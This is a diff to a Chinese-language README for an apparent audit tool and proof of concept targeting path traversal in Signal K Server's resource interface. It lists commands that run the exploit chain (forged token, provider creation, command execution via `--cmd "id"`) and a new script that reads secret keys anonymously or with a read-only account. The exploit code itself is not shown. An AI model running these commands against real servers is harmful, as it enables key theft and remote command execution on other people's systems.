@@ -22,9 +22,13 @@ Signal K Server 资源接口路径遍历的审计工具与 PoC。
 python3 signalk-audit.py -u http://127.0.0.1:3000
 python3 signalk-audit.py -u http://127.0.0.1:3000 --token <只读 JWT>
 python3 signalk-audit.py -u http://127.0.0.1:3000 --token <只读 JWT> --exploit --cmd "id"
+
+python3 sk_poc.py                                       # allow_readonly=true 的实例，匿名读密钥
+SK_USER=<只读账号> SK_PASS=<口令> python3 sk_poc.py <URL>   # 默认配置，先登录再读
 ```
 
-`--exploit` 会往下走伪造 token 和创建 provider 两步，默认不启用。
+`--exploit` 会往下走伪造 token 和创建 provider 两步，默认不启用。`sk_poc.py` 的 traversal 那一步
+在默认配置下会被 401 挡住，给一组只读账号（或直接给 `SK_TOKEN`）即可。
 
 输出示例（v2.33.0，带只读账号 token）：
 
